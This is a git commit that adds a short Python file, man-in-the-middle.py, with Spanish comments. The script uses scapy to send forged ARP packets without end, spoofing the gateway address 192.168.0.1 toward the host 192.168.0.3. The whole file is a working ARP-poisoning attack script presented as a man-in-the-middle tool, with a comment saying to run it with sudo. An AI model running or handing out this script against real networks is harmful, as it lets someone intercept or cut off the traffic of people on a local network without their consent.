f8591329f7b1f9e3c70cd4df0a05372a821830b2
Carlos <carlosmaccarrone@gmail.com>
2018-10-06 13:45:39 -0300

    Address Resolution Protocol

---
+++ man-in-the-middle.py
@@ -0,0 +1,10 @@
+#! /usr/bin/env python
+## -*- coding: latin-1 -*-
+#
+# ejecutar con sudo 
+# psrc=ip puerda enlace, pdst=ip destinatario, hwdst=mac inventada
+# al llegar a una estación siempre verifique su dirección mac
+# ARP Address Resolution Protocol
+from scapy.all import *
+s=ARP (op="who-has", psrc="192.168.0.1", pdst="192.168.0.3", hwdst="00:1e:d7:e2:d1:dc")
+send(s, inter=3, loop=1)
